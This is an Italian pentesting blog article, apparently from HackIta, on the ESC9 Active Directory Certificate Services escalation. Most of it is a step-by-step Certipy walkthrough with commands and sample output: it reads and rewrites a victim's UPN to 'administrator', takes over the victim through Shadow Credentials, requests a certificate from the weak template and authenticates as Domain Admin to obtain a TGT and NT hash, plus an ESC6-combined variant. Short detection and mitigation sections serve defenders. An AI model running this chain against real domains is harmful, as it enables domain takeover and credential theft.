---
title: 'ESC9 ADCS: Privilege Escalation tramite Template senza SID Security Extension'
slug: esc9-adcs
description: ESC9 sfrutta template AD CS senza SID Security Extension per impersonare utenti privilegiati. Guida pratica con Certipy e UPN manipulation.
image: /9.webp
draft: true
date: 2026-03-08T00:00:00.000Z
categories:
  - windows
subcategories:
  - privilege-escalation
tags:
  - ad
  - adcs
  - esc
  - certipy
---

ESC9 è una tecnica di **Active Directory Privilege Escalation tramite AD CS** che sfrutta certificate template configurati senza la **SID Security Extension**. Questa estensione (`szOID_NTDS_CA_SECURITY_EXT`) è stata introdotta negli aggiornamenti **Certifried (CVE-2022-26923)** per permettere ai Domain Controller di mappare in modo sicuro un certificato a un account Active Directory usando il **SID**.

Quando un template ha il flag **CT\_FLAG\_NO\_SECURITY\_EXTENSION**, i certificati emessi **non includono il SID dell’utente che ha richiesto il certificato**. Questo costringe il KDC a usare metodi di mapping più deboli come:

* **UPN mapping**
* **DNS mapping**

Se il dominio non è in **Full Enforcement mode**, questi metodi possono permettere l’impersonazione di altri utenti.

Il risultato: un attaccante può ottenere un certificato valido che il KDC mapperà all’account sbagliato.

***

# Identificazione con Certipy

Certipy rileva ESC9 controllando il flag `NoSecurityExtension` nel template.

```bash
certipy find -u 'user@corp.local' -p 'Password123' -dc-ip 10.0.0.100 -vulnerable -enabled -stdout
```

Output tipico:

```
Certificate Templates

Template Name : VulnTemplate
Enabled : True
Client Authentication : True

Enrollment Flag : NoSecurityExtension

Permissions
  Enrollment Rights : CORP.LOCAL\Domain Users

[!] Vulnerabilities
  ESC9 : Template has no security extension
```

Indicatori chiave:

* `Enrollment Flag : NoSecurityExtension`
* `[!] Vulnerabilities ESC9`
* EKU **Client Authentication**
* utenti con **Enrollment Rights**

***

# Exploit ESC9 ADCS con Certipy

Il modo classico di sfruttare ESC9 è tramite **UPN manipulation**.

L'attaccante modifica temporaneamente l’UPN di un account controllato per farlo combaciare con quello di un utente privilegiato.

***

## Step 1 — Leggere l’UPN della vittima

```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```

Output:

```
userPrincipalName : victim@CORP.LOCAL
```

***

## Step 2 — Modificare temporaneamente l’UPN

```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```

Ora l’account **victim** ha UPN `administrator`.

***

## Step 3 — Ottenere credenziali della vittima (opzionale)

Se l'attaccante non ha credenziali può usare **Shadow Credentials**.

```bash
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```

Output:

```
Saving credential cache to 'victim.ccache'
NT hash for 'victim'
```

***

## Step 4 — Richiedere certificato dal template ESC9

```bash
export KRB5CCNAME=victim.ccache
```

```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'VulnTemplate'
```

Output:

```
Got certificate with UPN 'administrator@corp.local'
Certificate has no object SID
Saving certificate to administrator.pfx
```

Il certificato contiene **UPN Administrator ma nessun SID**.

***

## Step 5 — Ripristinare UPN originale

```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```

***

## Step 6 — Autenticazione come Administrator

```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```

Output:

```
Got TGT
Saving credential cache to administrator.ccache
Got hash for administrator
```

Risultato:

* **Kerberos TGT**
* **NT hash**
* **Domain Admin**

***

# ESC9 combinato con ESC6

ESC9 diventa ancora più potente se combinato con **ESC6**.

ESC6 permette di inserire **SAN arbitrari nella richiesta di certificato**.

In questo caso l'attaccante può includere direttamente:

* UPN della vittima
* SID della vittima

***

### Richiesta certificato

```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'VulnTemplate' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'
```

Output:

```
Got certificate with UPN 'administrator@corp.local'
Certificate object SID is 'S-1-5-21-...-500'
Saving certificate to administrator.pfx
```

***

### Autenticazione

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

Output:

```
SAN UPN : administrator@corp.local
SAN URL SID : S-1-5-21-...-500
Got TGT
```

Questa tecnica funziona anche con **StrongCertificateBindingEnforcement = 2**.

***

# Detection ESC9 ADCS

Controllare:

* template con `NoSecurityExtension`
* template con **Client Authentication**
* permessi di enrollment troppo ampi

Indicatori utili:

* certificati senza **SID security extension**
* modifiche sospette agli **UPN**

***

# Mitigation ESC9 ADCS

Misure principali:

**1️⃣ Non usare `CT_FLAG_NO_SECURITY_EXTENSION`**
nei template.

**2️⃣ Abilitare Strong Certificate Binding**

```
StrongCertificateBindingEnforcement = 2
```

**3️⃣ Limitare enrollment rights**

**4️⃣ Abilitare manager approval** sui template sensibili.

***

# FAQ — ESC9 ADCS

### Cos'è ESC9?

Un template che emette certificati **senza SID security extension**.

### Perché è pericoloso?

Il KDC può usare mapping **UPN/DNS più deboli**, permettendo impersonazione.

### ESC9 funziona su domini patchati?

Dipende dalla configurazione del KDC.
Funziona sempre se combinato con **ESC6**.

### Qual è la differenza tra ESC9 e ESC6?

[ESC6](https://hackita.it/articoli/esc6-adcs) permette SAN arbitrari.
ESC9 rimuove il SID dal certificato.

***

**Key Takeaway:** se un template AD CS non include la **SID Security Extension**, il KDC può mappare il certificato usando solo l’UPN — permettendo impersonazione di account privilegiati.

***

> ESC9 è una delle tecniche più importanti nei certificate attacks.
> Per vedere tutte le escalation AD CS consulta la guida completa:
> [https://hackita.it/articoli/adcs-esc1-esc16](https://hackita.it/articoli/adcs-esc1-esc16)Continua con le tecniche successive:
> [https://hackita.it/articoli/esc10-adcs](https://hackita.it/articoli/esc10-adcs) · [https://hackita.it/articoli/esc11-adcs](https://hackita.it/articoli/esc11-adcs)Se queste guide ti sono utili puoi supportare HackIta:
> [https://hackita.it/supporto](https://hackita.it/supporto)Vuoi imparare pentesting Active Directory o testare la sicurezza della tua infrastruttura?
> [https://hackita.it/servizi](https://hackita.it/servizi)Riferimenti tecnici:
> [https://specterops.io/blog/2021/06/17/certified-pre-owned/](https://specterops.io/blog/2021/06/17/certified-pre-owned/)
> [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)
> [https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/)
